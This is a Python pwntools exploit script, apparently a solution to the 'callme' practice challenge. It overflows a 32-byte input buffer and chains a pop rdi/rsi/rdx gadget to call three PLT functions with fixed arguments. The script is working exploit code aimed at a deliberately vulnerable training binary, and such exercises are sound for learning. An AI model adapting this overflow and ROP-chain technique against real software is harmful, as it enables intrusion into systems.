#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template callme
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

param1 = p64(0xdeadbeefdeadbeef)
param2 = p64(0xcafebabecafebabe)
param3 = p64(0xd00df00dd00df00d)

# 0x004008a4 - ba20000000 - mov edx, 0x20 - ; 32 ; size_t n
std_in = b'A' * 32
bypass_ebx = p64(0x666)
ret_gadget = p64(0x4006be)
# ptl1 = p64(0x601040)
ptl1 = p64(0x400720)
# ptl2 = p64(0x601050)
ptl2 = p64(0x400740)
# ptl3 = p64(0x601028)
ptl3 = p64(0x4006f0)

plt_imp1 = p64(0x400905)
plt_imp2 = p64(0x400919)
plt_imp3 = p64(0x40092d)

usefull_func = p64(0x4008f2)

rdi_rsi_rdx_ret_gadget = p64(0x40093c)

payload2 = std_in + bypass_ebx + ret_gadget + rdi_rsi_rdx_ret_gadget + param1 + param2 + param3 + ptl1 + rdi_rsi_rdx_ret_gadget + param1 + param2 + param3 + ptl2 + rdi_rsi_rdx_ret_gadget + param1 + param2 + param3 + ptl3

io.sendlineafter(b'> ', payload2)

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.interactive()

